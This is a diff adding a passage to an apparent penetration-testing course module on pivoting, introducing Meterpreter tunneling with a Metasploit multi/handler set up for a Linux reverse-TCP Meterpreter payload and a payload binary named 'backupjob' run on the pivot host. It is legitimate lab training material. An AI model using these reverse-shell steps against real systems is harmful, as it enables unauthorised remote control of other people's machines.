@@ -389,4 +389,25 @@ The below graphical representation provides an alternative way to understand thi
 ![Diagram showing network setup: Attack Host (10.10.15.5) forwards remote port 8080 to local port 8000 via SSH. Victim Server (Ubuntu) listens on port 8080, forwards to SSH. Victim Server (Windows A) at 172.16.5.19 with RDP Service. Reverse shell forwarded to MSFConsole on port 8000.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/158/44.png)
 
 In addition to answering the challenge questions, practice this technique and try to obtain a reverse shell from the Windows target.
+# Meterpreter Tunneling & Port Forwarding
 
+Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port `8080`.
+
+Before copying the payload over, we can start a [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/), also known as a Generic Payload Handler.
+#### Configuring & Starting the multi/handler
+
+```shell
+msf6 > use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8080
+lport => 8080
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:8080
+```
+We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and execute it to gain a Meterpreter session.
+#### Executing the Payload on the Pivot Host
